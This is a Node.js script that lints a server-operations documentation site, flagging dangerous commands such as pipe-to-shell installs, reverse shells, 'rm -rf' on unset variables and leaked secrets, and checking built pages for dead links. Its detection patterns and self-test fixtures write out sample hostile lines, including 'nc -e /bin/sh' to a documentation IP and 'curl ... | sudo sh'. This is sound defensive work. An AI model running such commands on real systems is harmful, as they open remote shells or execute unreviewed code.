#!/usr/bin/env node
/**
 * Content gate for the site.
 *
 * This site tells people to paste commands into a root shell on a server they
 * care about. That makes a wrong command here more dangerous than a wrong
 * paragraph, and it makes the site a distribution channel worth protecting:
 * anyone who can land text in these pages can land a command in someone's
 * terminal. The checks below are the floor under that.
 *
 * Two classes:
 *   - dangerous or unpinned commands in documented instructions
 *   - links and anchors that do not resolve in the built output
 *
 * Every rule can be waived, but only in ALLOW below, and only with a reason —
 * a rule that gets silently disabled protects nothing. Run after `astro build`,
 * because the link checks read `dist/`.
 *
 *   npm run check
 */
import { readFileSync, readdirSync, statSync, existsSync } from 'node:fs';
import { join, relative } from 'node:path';

const DOCS = 'src/content/docs';
const DIST = 'dist';

/** Waivers. Each needs a reason; an entry without one is itself a failure. */
const ALLOW = [
	{
		rule: 'docker-socket',
		file: 'security/isolation/index.mdx',
		reason: 'Explains why mounting the socket is dangerous — the string is the subject, not an instruction.',
	},
	{
		rule: 'docker-socket',
		file: 'architecture/index.md',
		reason: 'Describes that the proxy does NOT mount the socket.',
	},
	{
		rule: 'privileged',
		file: 'security/isolation/index.mdx',
		reason: 'Names `privileged` as the setting to avoid.',
	},
	{
		rule: 'privileged',
		file: 'project/index.md',
		reason: 'States that no container runs privileged.',
	},
];

const RULES = [
	{
		id: 'pipe-to-shell',
		severity: 'error',
		re: /(?:curl|wget)[^\n|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh)\b/g,
		why: 'Piping a download straight into a shell executes whatever the server returns, unreviewed. Download, read, then run.',
	},
	{
		id: 'tls-verification-off',
		severity: 'error',
		re: /(?:curl[^\n]*\s(?:-k|--insecure)\b)|(?:wget[^\n]*--no-check-certificate)/g,
		why: 'Disabling certificate verification turns an encrypted channel into an unauthenticated one.',
	},
	{
		id: 'chmod-777',
		severity: 'error',
		re: /chmod\s+(?:-R\s+)?777\b/g,
		why: 'World-writable is almost never the fix, and it is rarely reverted afterwards.',
	},
	{
		id: 'rm-rf-root',
		severity: 'error',
		// `rm -rf /` and `rm -rf $UNSET/...` — an empty variable makes these identical.
		re: /rm\s+-[rf]{1,2}\s+(?:\/\s*$|\/\s|\$\{?\w+\}?\/)/gm,
		why: 'An unset variable expands to nothing, which turns this into a delete from the filesystem root.',
	},
	{
		id: 'privileged',
		severity: 'error',
		re: /(?:--privileged|privileged:\s*true)/g,
		why: 'Removes essentially all container isolation at once.',
	},
	{
		id: 'docker-socket',
		severity: 'error',
		re: /\/var\/run\/docker\.sock/g,
		why: 'The Docker socket is root on the host. Use a filtering socket proxy instead.',
	},
	{
		id: 'latest-tag',
		severity: 'error',
		re: /image:\s*\S+:latest\b|docker\s+(?:run|pull)[^\n]*:latest\b/g,
		why: 'An unpinned tag means the thing tested and the thing running differ at some unknown point.',
	},
	{
		id: 'reverse-shell',
		severity: 'error',
		re: /\bnc\s+[^\n]*-e\s|\/dev\/tcp\/\d/g,
		why: 'Reverse-shell shape. Nothing on an operator documentation site should need one.',
	},
	{
		id: 'real-secret',
		severity: 'error',
		// A long high-entropy literal assigned to something credential-shaped, and
		// not one of the obvious placeholders.
		re: /(?:TOKEN|PASSWORD|SECRET|APIKEY|API_KEY)\s*[=:]\s*["']?(?![A-Za-z]*(?:REPLACE|EXAMPLE|CHANGE|your-|<))[A-Za-z0-9+/=_-]{24,}/gi,
		why: 'Looks like a real credential rather than a placeholder.',
	},
	{
		id: 'non-example-domain',
		severity: 'error',
		// Any number of labels before the suffix — `vault.mycompany.internal` has
		// two, and an earlier version of this rule only matched one.
		re: /(?:https?:\/\/|@)(?:[a-z0-9-]+\.)+(?:local|lan|internal|home)\b/g,
		why: 'Use example.com. Private hostnames leak an environment into a public repository.',
	},
];

/* --- self-test ------------------------------------------------------
 *
 * A checker that has never been seen to fail is not evidence of anything. Each
 * rule carries a sample it must catch and a near-miss it must not, so a regex
 * that silently stops matching — or starts matching everything — is caught by
 * `npm run check:self` rather than by nobody.
 */
const FIXTURES = {
	'pipe-to-shell': {
		catches: 'curl -s https://install.example.com | sudo sh',
		ignores: 'curl -s https://example.com/file.tar.gz -o file.tar.gz',
	},
	'tls-verification-off': {
		catches: 'curl -k https://example.com/health',
		ignores: 'curl -sI https://example.com/health',
	},
	'chmod-777': { catches: 'chmod -R 777 /srv/data', ignores: 'chmod 640 /srv/data/.env' },
	'rm-rf-root': { catches: 'rm -rf ${VOLUME_PATH}/data', ignores: 'rm -rf ./volumes/local' },
	privileged: { catches: 'docker run --privileged alpine', ignores: 'no-new-privileges:true' },
	'docker-socket': {
		catches: '- /var/run/docker.sock:/var/run/docker.sock',
		ignores: 'tecnativa/docker-socket-proxy',
	},
	'latest-tag': { catches: 'image: nginx:latest', ignores: 'image: nginx:1.29-alpine' },
	'reverse-shell': { catches: 'nc -e /bin/sh 203.0.113.5 4444', ignores: 'nc -z 127.0.0.1 5432' },
	'real-secret': {
		catches: 'ADMIN_TOKEN=aG7xQ2mZ9pL4vR8tY1wB6nK3sD5fJ0hC',
		ignores: 'ADMIN_TOKEN=__REPLACE_ME__',
	},
	'non-example-domain': {
		catches: 'https://vault.mycompany.internal',
		ignores: 'https://vault.example.com',
	},
};

if (process.argv.includes('--self-test')) {
	const problems = [];
	for (const rule of RULES) {
		const f = FIXTURES[rule.id];
		if (!f) {
			problems.push(`${rule.id}: no fixture — every rule needs one`);
			continue;
		}
		rule.re.lastIndex = 0;
		if (!rule.re.test(f.catches)) problems.push(`${rule.id}: missed its own sample — ${f.catches}`);
		rule.re.lastIndex = 0;
		if (rule.re.test(f.ignores)) problems.push(`${rule.id}: fired on a safe line — ${f.ignores}`);
		rule.re.lastIndex = 0;
	}
	if (problems.length) {
		for (const p of problems) console.log(`FAIL  ${p}`);
		process.exit(1);
	}
	console.log(`self-test: ${RULES.length}/${RULES.length} rules catch their sample and ignore the near-miss`);
	process.exit(0);
}

/* ------------------------------------------------------------------ */

function walk(dir, out = []) {
	for (const name of readdirSync(dir)) {
		const p = join(dir, name);
		if (statSync(p).isDirectory()) walk(p, out);
		else if (/\.mdx?$/.test(p)) out.push(p);
	}
	return out;
}

const waived = (rule, file) => ALLOW.some((a) => a.rule === rule && file.endsWith(a.file));

const findings = [];

for (const path of walk(DOCS)) {
	const rel = relative(DOCS, path);
	const text = readFileSync(path, 'utf8');
	const lines = text.split('\n');

	for (const rule of RULES) {
		if (waived(rule.id, rel)) continue;
		rule.re.lastIndex = 0;
		let m;
		while ((m = rule.re.exec(text)) !== null) {
			const line = text.slice(0, m.index).split('\n').length;
			findings.push({
				severity: rule.severity,
				rule: rule.id,
				file: `${DOCS}/${rel}`,
				line,
				snippet: lines[line - 1]?.trim().slice(0, 100) ?? '',
				why: rule.why,
			});
		}
	}
}

/* --- links and anchors, against the built output ------------------- */

if (existsSync(DIST)) {
	const htmlFiles = [];
	(function collect(dir) {
		for (const name of readdirSync(dir)) {
			const p = join(dir, name);
			if (statSync(p).isDirectory()) collect(p);
			else if (name === 'index.html') htmlFiles.push(p);
		}
	})(DIST);

	const routeOf = (p) => ('/' + relative(DIST, p).replace(/index\.html$/, '')).replace(/\/+/g, '/');
	const routes = new Map();
	for (const f of htmlFiles) {
		const html = readFileSync(f, 'utf8');
		routes.set(routeOf(f), new Set([...html.matchAll(/id="([^"]+)"/g)].map((m) => m[1])));
	}
	const nonHtml = new Set(['/llms.txt', '/robots.txt', '/.well-known/security.txt']);

	for (const f of htmlFiles) {
		const html = readFileSync(f, 'utf8');
		for (const m of html.matchAll(/href="(\/[^"?]*)"/g)) {
			const [route, frag] = m[1].split('#');
			if (nonHtml.has(route) || /^\/(?:_astro|pagefind|favicon)/.test(route)) continue;
			const norm = route.endsWith('/') ? route : `${route}/`;
			if (/\.[a-z0-9]+$/i.test(route)) continue;
			if (!routes.has(norm)) {
				findings.push({
					severity: 'error',
					rule: 'dead-link',
					file: relative(DIST, f),
					line: 0,
					snippet: m[1],
					why: 'Internal link points at a route that was not built.',
				});
			} else if (frag && !routes.get(norm).has(frag)) {
				findings.push({
					severity: 'error',
					rule: 'dead-anchor',
					file: relative(DIST, f),
					line: 0,
					snippet: m[1],
					why: 'Anchor does not exist on the target page.',
				});
			}
		}
	}
} else {
	console.log('note: dist/ not present — link and anchor checks skipped. Run `npm run build` first.\n');
}

/* --- report -------------------------------------------------------- */

const seen = new Set();
const unique = findings.filter((f) => {
	const k = `${f.rule}|${f.file}|${f.line}|${f.snippet}`;
	if (seen.has(k)) return false;
	seen.add(k);
	return true;
});

for (const a of ALLOW) {
	if (!a.reason?.trim()) {
		unique.push({
			severity: 'error',
			rule: 'waiver-without-reason',
			file: 'scripts/check-content.mjs',
			line: 0,
			snippet: `${a.rule} in ${a.file}`,
			why: 'A waiver has to say why, or it is just the check turned off.',
		});
	}
}

const errors = unique.filter((f) => f.severity === 'error');

if (unique.length === 0) {
	console.log(`content check: clean (${RULES.length} rules, ${ALLOW.length} reviewed waivers)`);
	process.exit(0);
}

for (const f of unique) {
	const where = f.line ? `${f.file}:${f.line}` : f.file;
	console.log(`${f.severity.toUpperCase()}  [${f.rule}]  ${where}`);
	console.log(`       ${f.snippet}`);
	console.log(`       ${f.why}\n`);
}

console.log(`${errors.length} error(s), ${unique.length - errors.length} warning(s)`);
process.exit(errors.length > 0 ? 1 : 0);
